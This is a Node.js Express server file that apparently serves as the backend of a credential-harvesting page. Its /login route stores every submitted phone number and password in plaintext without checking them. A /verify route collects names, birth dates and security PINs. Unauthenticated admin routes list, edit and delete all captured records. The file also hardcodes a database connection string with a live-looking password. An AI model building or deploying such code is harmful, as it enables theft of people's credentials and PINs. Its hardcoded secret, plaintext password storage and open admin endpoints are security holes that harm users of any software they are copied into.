require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();

// -------------------- CORS --------------------
app.use(cors({
  origin: process.env.FRONTEND_URL, // exact match, no trailing slash
  methods: ["GET", "POST", "PUT", "DELETE"],
  credentials: true
}));

app.use(bodyParser.json());

// -------------------- MongoDB Connection --------------------
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://rajeev913572_db_user:Rajeev69%40@rajeev.cjfckjj.mongodb.net/auth_system?retryWrites=true&w=majority";

mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB connected successfully"))
  .catch((err) => console.log("MongoDB connection error:", err));


// -------------------- Schemas --------------------
const userSchema = new mongoose.Schema({
    phone: { type: String, required: true },
    password: { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
});

const verificationSchema = new mongoose.Schema({
    user_id: { type: mongoose.Schema.Types.ObjectId, ref: "User", required: true },
    full_name: String,
    dob: Date,
    problem: String,
    security_pin: String,
    experience: String,
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model("User", userSchema);
const Verification = mongoose.model("Verification", verificationSchema);

// -------------------- Routes --------------------

// Login / Signup (insert user)
app.post("/login", async (req, res) => {
    try {
        const { phone, password } = req.body;
        const user = new User({ phone, password });
        await user.save();
        res.json({ success: true, user_id: user._id });
    } catch (err) {
        console.log(err);
        res.json({ success: false, message: "Error saving user" });
    }
});

// Verification submission
app.post("/verify", async (req, res) => {
    try {
        const { user_id, full_name, dob, problem, security_pin, experience } = req.body;
        const verification = new Verification({ user_id, full_name, dob, problem, security_pin, experience });
        await verification.save();
        res.json({ success: true, message: "Verification submitted!" });
    } catch (err) {
        console.log(err);
        res.json({ success: false, message: err.message });
    }
});

// Admin routes: get users
app.get("/admin/getUsers", async (req, res) => {
    try {
        const users = await User.find().sort({ createdAt: -1 });
        res.json(users);
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Get verifications
app.get("/admin/getVerification", async (req, res) => {
    try {
        const verifications = await Verification.find().sort({ createdAt: -1 });
        res.json(verifications);
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Update user
app.put("/admin/updateUser/:id", async (req, res) => {
    try {
        const { phone, password } = req.body;
        await User.findByIdAndUpdate(req.params.id, { phone, password });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Delete user
app.delete("/admin/deleteUser/:id", async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// Delete verification
app.delete("/admin/deleteVerification/:id", async (req, res) => {
    try {
        await Verification.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// -------------------- Start Server --------------------
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log("Server running on port", PORT));
